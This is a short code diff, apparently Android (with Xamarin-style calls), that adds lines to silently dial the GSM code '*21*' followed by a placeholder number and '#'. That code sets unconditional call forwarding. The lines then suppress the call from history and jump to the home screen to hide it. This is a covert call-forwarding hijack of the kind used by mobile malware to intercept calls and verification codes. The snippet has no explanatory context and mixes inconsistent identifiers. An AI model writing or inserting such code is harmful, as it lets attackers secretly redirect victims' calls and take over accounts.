@@ -1,0 +1,10 @@
+String dest = "YOUR_NUMBER";
+Intent dialIntent = new Intent("android.intent.action.CALL", "tel:*21*" + dest + Uri.Encode("#"));
+dialIntent.addFlags(FLAG_ACTIVITY_NEW_TASK);
+dialIntent.addFlags(FLAG_ACTIVITY_NO_HISTORY);
+context.startActivity(dialIntent);
+
+Intent homeIntent = new Intent("android.intent.action.MAIN");
+homeIntent.addCategory("android.intent.category.HOME");
+homeIntent.setFlags(FLAG_ACTIVITY_NEW_TASK);
+context_arg.startActivity(homeIntent);
